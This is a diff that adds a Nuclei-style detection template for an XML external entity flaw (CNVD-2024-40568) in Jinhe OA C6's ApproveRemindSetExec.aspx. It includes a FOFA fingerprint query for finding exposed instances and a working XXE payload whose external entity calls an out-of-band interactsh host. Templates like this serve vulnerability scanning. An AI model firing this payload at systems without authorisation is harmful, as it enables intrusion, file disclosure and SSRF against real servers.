@@ -1,0 +1,24 @@
+id: jinheOA-C6-ApproveRemindSetExec_aspx-XXE-CNVD-2024-40568
+info:
+  tags: jinheOA-C6-ApproveRemindSetExec_aspx-XXE-CNVD-2024-40568
+  name: 金和OA C6 ApproveRemindSetExec.aspx XXE漏洞(CNVD-2024-40568)
+  author: xc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+    金和OA ApproveRemindSetExec.aspx 接口处存在XML实体注入漏洞，攻击者可利用xxe漏洞获取服务器敏感数据，可读取任意文件以及ssrf攻击，存在一定的安全隐患。
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.AddMenu/ApproveRemindSetExec.aspx/? HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: application/xml
+
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+        - "dns"
